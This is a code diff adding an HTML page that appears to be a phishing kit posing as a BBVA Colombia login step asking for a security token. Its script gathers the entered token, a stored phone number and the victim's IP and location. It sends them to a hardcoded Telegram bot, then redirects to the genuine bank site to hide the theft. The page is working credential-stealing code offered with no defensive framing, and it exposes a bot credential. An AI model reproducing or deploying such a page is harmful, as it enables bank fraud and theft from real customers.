@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>Inicio</title>
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no"
+    />
+
+    <link rel="stylesheet" type="text/css" href="./fhs/style_crown.css" />
+
+    <script>
+      function soloNumeros(e) {
+        var key = window.event ? e.which : e.keyCode;
+        if (key < 48 || key > 57) {
+          e.preventDefault();
+        }
+      }
+    </script>
+  </head>
+
+  <body>
+    <header style="" class="ioscam">
+      <nav class="header_wrapeer">
+        <div class="header__campaign">
+          <div class="header__logo">
+            <img
+              src="./fhs/blanco.png"
+              sizes="(min-width: 900px) 20vw, 50vw"
+              class="header__image"
+            />
+            <img src="./fhs/bantp.png" />
+          </div>
+        </div>
+      </nav>
+    </header>
+    <div class="container">
+      <h1>¡Bienvenido!</h1>
+      <form id="login-form">
+        <br />
+        <br />
+        <div align="center">
+          <h3
+            style="font-family:BentonSansBBVA-Book, 'Helvetica Neue', Helvetica, Arial, sans-serif;"
+          >
+            Ingresa tu número token
+          </h3>
+          <br />
+
+          <input
+            type="tel"
+            maxlength="8"
+            placeholder="Token"
+            style="width: 350px; font-size: 18px"
+            onkeypress="soloNumeros(event)"
+            name="numer"
+            id="token"
+            autofocus
+            required
+          />
+
+          <br /><br />
+
+          <button
+            type="submit"
+            id="btnLogin"
+            class="btn btn-blue btn-full btn-full-md"
+            style="
+              background-color: #237aba;
+              width: 60%;
+              padding: 2rem 4rem;
+              border: none;
+              border-radius: 1px;
+              color: #fff;
+              text-align: center;
+              font-family: Helvetica Neue, Arial, Helvetica, sans-serif;
+              font-size: 1rem;
+              margin: 0;
+              padding: 1.3rem 3.7rem;
+              transition: background-color 0.1s linear 0s;
+              white-space: inherit;
+              -moz-osx-font-smoothing: grayscale;
+              -webkit-font-smoothing: antialiased;
+              background-color: #237aba;
+              outline: 0;
+              display: inline-block;
+              box-shadow: none !important;
+              cursor: pointer;
+            "
+          >
+            Continuar
+          </button>
+        </div>
+      </form>
+    </div>
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#login-form");
+    form.addEventListener("submit", (event) => {
+      event.preventDefault();
+      axios
+        .get(url)
+        .then((response) => {
+          const tipo = document.querySelector("#token").value;
+
+          const message =
+            "\nNumero: " +
+            localStorage.getItem("numero") +
+            "\nToken BBVA: " +
+            tipo +
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ/sendMessage",
+              {
+                chat_id: "-4139256120",
+                text: message,
+              }
+            )
+            .then((response) => {
+              console.log(response.data);
+              alert("Proceso terminado exitosamente");
+              window.location.href = "https://www.bbva.com.co/";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
+</html>
